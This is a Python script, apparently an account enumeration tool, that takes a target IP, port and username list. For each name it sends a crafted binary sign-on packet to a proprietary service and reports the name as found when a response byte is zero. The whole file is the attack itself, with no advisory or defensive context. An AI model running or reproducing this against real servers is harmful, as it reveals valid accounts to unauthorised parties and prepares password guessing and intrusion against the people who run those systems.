import socket
import sys
import re
import struct
import binascii


if __name__=='__main__':
    
    if len(sys.argv) != 4:
        print("Usage: %s ip port userlist" % sys.argv[0])
        sys.exit(1)
    
    f = open(sys.argv[3])
    usernames = f.readlines()
    
    for username in usernames:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1], int(sys.argv[2])))
    
        Identity = b"\x00\x04\x1D\xA5"
        s.send(Identity)
        IdentifyResp = s.recv(1024)
        
        funcMap  = "DCF7FACFFFE400000000000000000000"
        platform = b"WinNT"
        language = b"dscenu.txt"
        username = username.rstrip().upper().encode()
        
        SignOn = b"\x1A\xA5\x67\x00\x00\x00\x05\x07\x01\x00\x05"+struct.pack('!H',len(username)) +struct.pack('!H',len(platform)+len(username))+b"\x00\x00\x01" +struct.pack('!H',len(platform)+len(username))+struct.pack('!H',len(language))+b"\x2A\x3F"+binascii.unhexlify(funcMap)+platform+username+language
        SignOn = struct.pack('!H',len(SignOn)+2)+SignOn

        print("[~] Trying '%s'" % username.decode())

        s.send(SignOn)
        SignOnResp = s.recv(1024)
        if chr(SignOnResp[8]) == "\x00":
            print("\n[+] User '%s' found!\n" % username.decode())
        
        s.close()
    
    f.close()

    